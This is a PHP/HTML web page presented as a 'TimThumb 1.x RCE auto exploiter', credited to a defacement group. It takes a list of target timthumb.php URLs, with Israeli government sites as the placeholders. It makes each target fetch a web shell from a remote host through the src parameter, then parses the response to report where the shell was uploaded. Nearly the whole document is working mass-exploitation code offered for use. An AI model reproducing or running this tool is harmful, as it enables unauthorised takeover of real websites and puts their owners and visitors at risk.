<!--
-->

<title>
AUTO EXPLOIR TIMTHUMB 1.X RCE
</title>

<style>
@import url(https://fonts.googleapis.com/css?family=Aldrich);

body {
background: black;
color: lime;
font-family: "Aldrich";
}

textarea {
width: 800px; 
height: 250px; 
margin: 5px auto; 
resize: none;
border: 2px solid lime;
background: transparent;
border-radius: 5px;
color: lime;
font-family: "Aldrich";
}

input {
background: transparent;
width: 800px;
height: 35px;
border: 2px solid lime;
color: lime;
border-radius: 5px;
font-family: "Aldrich";
}

tr,td {
border: 2px solid lime;
height: 40px;
width: 800px;
border-radius: 5px;
}
</style>

<br>

TIMTHUMB RCE 1.X AUTO EXPLOITER
<br>
~Special Thanks To Jhon And All Member Anon Ghost
<br>
Copyright_2019_Powered_By_Sad-Boy_Web

<br>

<form action="" method="POST">
<textarea name="url" placeholder="http://website.gov.il/timthumb.php
https://website.gov.il/admin/timthumb.php"></textarea>

<br><br>

<input type="submit" name="dor" value="EXECUTE">
</form>
</center>

<?php
// REPORTING
error_reporting(5);
@ignore_user_abort(TRUE);
@set_magic_quotes_runtime(0);

// SET TIME
@set_time_limit(0);

function send($url){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$output = curl_exec($ch);
curl_close($ch);
return $output;
}

$url = $_POST['url'];
$explode = explode("\r\n",$url);
if($_POST['dor']){
	
foreach($explode as $site){

/* LETAK SHELL YANG INGIN DI IMPORT ATAU DI KIRIM KE WEBSITE TARGET */
$data = send($site."?src=https://website.com/yourshell.php");
	
if(preg_match("/Unable to open image/",$data)){
$datas = explode("Unable to open image :",$data);
$pec = explode("<br />",$datas[1]);
echo "
<center>
<table>
<tr>
<td>
&nbsp;[+] SCAN : $site <br>
</td>
</tr>";

echo "
<tr>
<td>
&nbsp;[+] RESULT : <font color='lime'>".$pec[0]."</font>
</td>
</tr>
</table>
</center>
<br>";
} else {
echo "
<center>
<table>
<tr>
<td>
&nbsp;[-] SCAN : $site 
<br>
</tr>
</td>";

echo "
<tr>
<td>
&nbsp;[-] RESULT : <font color=red>THIS SITE NOT VULN</font>
</td>
</tr>
</table>
</center>
<br>";
}
}
}
?>